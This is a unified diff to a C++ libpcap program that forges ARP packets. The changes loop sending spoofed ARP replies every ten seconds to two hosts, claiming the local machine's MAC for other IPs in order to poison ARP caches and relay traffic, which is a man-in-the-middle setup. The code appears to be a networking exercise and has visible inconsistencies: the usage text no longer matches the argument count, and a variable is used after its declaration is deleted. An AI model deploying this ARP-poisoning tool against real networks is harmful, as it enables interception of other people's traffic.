@@ -43,6 +43,8 @@ using namespace std;
  char change_mac(char mac[], unsigned char *packet) {
 
      sscanf(mac, "%x:%x:%x:%x:%x:%x", &packet[0], &packet[1], &packet[2], &packet[3], &packet[4], &packet[5]);
+
+
  }
 
 
@@ -52,12 +54,12 @@ int main(int argc, char *argv[])
     ether_arp_hdr *eth_arp_hdr;
     eth_arp_hdr = new ether_arp_hdr;
 
-
-    if (argc != 6) {
+    if (argc != 7) {
         cout << "Usage : " << argv[0] << " Device Target_ip Sender_ip My_mac Sender_mac";
         return -1;
     }
 
+    while(1) {
 
     char *dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -76,6 +78,7 @@ int main(int argc, char *argv[])
 
     // =========================================================
     cout << "Ethernet Source : " << endl;
+ 
     int fd;
     fd = socket(AF_INET, SOCK_DGRAM, 0);
     if(fd < 0) {
@@ -85,7 +88,6 @@ int main(int argc, char *argv[])
 
     struct ifreq ifr;
     struct sockaddr_in *sin;
-    sockaddr_in addr;
 
     strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
     if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
@@ -141,12 +143,82 @@ int main(int argc, char *argv[])
     memcpy(&eth_arp_hdr->__ar_tip, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));
 
     // =========================================================
-
+ // relay
     if (pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
         cout << "Error sending the packet" << endl;
         return -1;
     }
     else cout << endl << endl << "Good" << endl;
+
+
+    sleep(10);
+
+
+// =========================================================
+
+cout << "Ethernet Destination : " << endl;
+change_mac(argv[5], eth_arp_hdr->h_dest);
+
+// =========================================================
+cout << "Ethernet Source : " << endl;
+fd = socket(AF_INET, SOCK_DGRAM, 0);
+if(fd < 0) {
+    cout << "socket error" << endl;
+    return -1;
+}
+
+
+strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
+if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
+    cout << "Mac error" << endl;
+    return -1;
+}
+
+cout << "-- My Mac address : ";
+for(int i=0; i<6; i++) {
+cout << (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i] << " ";
+eth_arp_hdr->h_source[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
+}
+
+// =========================================================
+
+cout << endl << "Sender ip : " << endl;
+addr.sin_addr.s_addr = inet_addr(argv[3]);
+memcpy(&eth_arp_hdr->__ar_sip, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));
+
+// =========================================================
+
+eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
+cout << "ether-type : " << eth_arp_hdr->h_proto << endl << endl;
+
+// =========================================================
+
+cout << "Sender mac : ";
+for(int i=0; i<6; i++) {
+cout << (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i] << " ";
+eth_arp_hdr->__ar_sha[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
+}
+
+cout << endl << "Target mac : " << endl;
+change_mac(argv[6], eth_arp_hdr->__ar_tha);
+
+// =========================================================
+
+cout << "Target ip : " << eth_arp_hdr->__ar_tip;
+addr.sin_addr.s_addr = inet_addr(argv[2]);
+memcpy(&eth_arp_hdr->__ar_tip, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));
+
+
+if (pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
+    cout << "Error sending the packet" << endl;
+    return -1;
+}
+else cout << endl << endl << "Good" << endl;
+
+}
+
+    sleep(10);
+
 
 }
 
